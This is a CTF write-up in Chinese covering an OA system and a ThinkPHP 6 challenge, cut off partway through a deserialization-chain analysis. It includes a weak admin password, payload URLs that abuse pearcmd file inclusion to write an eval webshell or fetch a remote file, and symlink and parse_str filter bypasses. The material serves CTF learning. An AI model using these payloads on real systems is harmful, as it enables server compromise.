<p>还是贴个链接，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MS9hcnRpY2xlL2RldGFpbHMvMTIxNDUxMjc5P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNzQ4Njc4MTE2NzgwMjU1MjM3MDI1JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZhbGwuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2Mzc0ODY3ODExNjc4MDI1NTIzNzAyNSZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH5maXJzdF9yYW5rX2VjcG1fdjF+dGltZXNfcmFuay00LTEyMTQ1MTI3OS5maXJzdF9yYW5rX3YyX3BjX3JhbmtfdjI5JnV0bV90ZXJtPSVFOCVBNSVCRiVFNiVCOSU5NiVFOCVBRSVCQSVFNSU4OSU5MSZzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">fmyyy1师傅的wp</span></p>
<h2 id="OA-RCE"><a href="#OA-RCE" class="headerlink" title="OA?RCE?"></a>OA?RCE?</h2><!-- 强网拟态决赛才遇到的pearcmd文件包含，没过几天又来了

因为不够专注外加debug一直搞不好的缘故，我一直审不好框架，唉，总之勉强也算能看明白了 -->

<p>弱密码登入 admin admin123</p>
<p>尝试文件上传都显示服务器有问题</p>
<p>审计源码</p>
<p>首先是index模块的phpinfo方法可以看到phpinfo界面：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">phpinfoAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;display = <span class="literal">false</span>;</span><br><span class="line">	<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>register_argc_argv</code>是开启的</p>
<p>可以对pearcmd进行文件包含：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshtmlAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$surl</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;surl&#x27;</span>));</span><br><span class="line">	<span class="variable">$num</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">	<span class="variable">$menuname</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;menuname&#x27;</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$surl</span>))<span class="keyword">exit</span>(<span class="string">&#x27;not found&#x27;</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>.P.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$surl</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>.P.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$surl</span>.<span class="string">&#x27;.shtml&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))<span class="keyword">exit</span>(<span class="string">&#x27;404 not found &#x27;</span>.<span class="variable">$surl</span>.<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">contain</span>(<span class="variable">$surl</span>,<span class="string">&#x27;home/index/rock_index&#x27;</span>))<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showhomeitems</span>();<span class="comment">//首页的显示</span></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;displayfile = <span class="variable">$file</span>;</span><br><span class="line">	<span class="comment">//记录打开菜单日志</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$num</span>!=<span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;useropt&#x27;</span>)==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">		<span class="title function_ invoke__">m</span>(<span class="string">&#x27;log&#x27;</span>)-&gt;<span class="title function_ invoke__">addlog</span>(<span class="string">&#x27;打开菜单&#x27;</span>, <span class="string">&#x27;菜单[&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$menuname</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处仅限制了文件扩展名为<code>.php</code></p>
<p>文件位置：<code>/usr/local/lib/php/pearcmd.php</code>，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTIxMDQyMjkw">pearcmd知识</span></p>
<p>由于会进行解码，先进行一个base64的编码:<br><code>Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA</code></p>
<blockquote>
<p>?m&#x3D;index&amp;a&#x3D;getshtml&amp;surl&#x3D;Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA</p>
</blockquote>
<p>这样就包含到了，接着是进行命令执行</p>
<p>利用一</p>
<p>在（可写）目录下写马：</p>
<blockquote>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;flow&#x2F;page&#x2F;</p>
</blockquote>
<p>即：</p>
<blockquote>
<p>?m&#x3D;index&amp;a&#x3D;getshtml&amp;surl&#x3D;Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA&amp;&#x2F;<?=eval($_GET[1])?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;flow&#x2F;page&#x2F;1.php</p>
</blockquote>
<p>利用二：</p>
<p>利用install指令出网下载到一个马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA&amp;+install+-R+/tmp+http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure>
<p>然后按照连接文章里面说的，-R是指定下载目录，而最终所在目录是指定目录下的<code>tmp/pear/download</code>下</p>
<p>按照包含<code>pearcmd.php</code>文件的方法进行包含利用：</p>
<blockquote>
<p>?m&#x3D;index&amp;a&#x3D;getshtml&amp;surl&#x3D;Li4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3RtcC9wZWFyL2Rvd25sb2FkLzE</p>
</blockquote>
<h2 id="EasyTp"><a href="#EasyTp" class="headerlink" title="EasyTp"></a>EasyTp</h2><p>题目：访问<code>/public</code>开始攻击</p>
<p>提示了<code>highlight_file</code></p>
<p>利用<code>[WMCTF2020]Make PHP Great Again</code>的知识点：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjEzMjM1">知识点链接</span></p>
<p>符号链接绕过</p>
<blockquote>
<p>&#x2F;public&#x2F;?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;app&#x2F;controller&#x2F;Index.php</p>
</blockquote>
<p>获取源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\s+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$file</span>))&#123; <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt; no flag..&#x27;</span>);&#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;file_exists() return true..&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">die</span>( <span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;file_exists() return false..&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error! no file parameter &lt;br/&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;highlight_file Error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vulvul&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;vulvul&#x27;</span>];</span><br><span class="line">            <span class="variable">$vul</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$vul</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/O/i&quot;</span>,<span class="variable">$value</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;&lt;/br&gt; &lt;h1&gt;Hacking?&#x27;</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>path部分如果为<code>///</code>则会导致parse_str函数解析错误</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdHIxcGxlL3AvMTExMzcxNTkuaHRtbA==">parse_str绕过知识点</span></p>
<blockquote>
<p>&#x2F;&#x2F;&#x2F;public&#x2F;Index&#x2F;unser?vulvul</p>
</blockquote>
<p>绕过检测，可以进行反序列化</p>
<p>先传入：</p>
<blockquote>
<p>?s&#x3D;1</p>
</blockquote>
<p>得到版本为6.x</p>
<p>使用composer在网上下载个源码调下链子：</p>
<blockquote>
<p>composer create-project topthink&#x2F;think&#x3D;6.0.x-dev v6.0</p>
</blockquote>
<p>6.x的新入口：vendor&#x2F;topthink&#x2F;think-orm&#x2F;src&#x2F;Model.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入save函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setAttrs</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入回调</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;AfterWrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新记录原始数据</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;origin   = <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;get      = [];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下一步是进入updataData函数</span></span><br><span class="line">    <span class="comment">// 前提：</span></span><br><span class="line">    <span class="comment">// $this-&gt;isEmpty()为false,</span></span><br><span class="line">    <span class="comment">// $this-&gt;trigger(&#x27;BeforeWrite&#x27;)为true</span></span><br><span class="line">    <span class="comment">// $this-&gt;exists为true</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// isEmpty()</span></span><br><span class="line">    <span class="comment">// vendor/topthink/think-orm/src/model/concern/Model.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此处构造$data非空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger()</span></span><br><span class="line">    <span class="comment">// vendor/topthink/think-orm/src/model/concern/ModelEvent.php</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>([<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>], <span class="variable language_">$this</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_object</span>(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;model.&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="variable language_">$this</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>);</span><br><span class="line">            &#125; 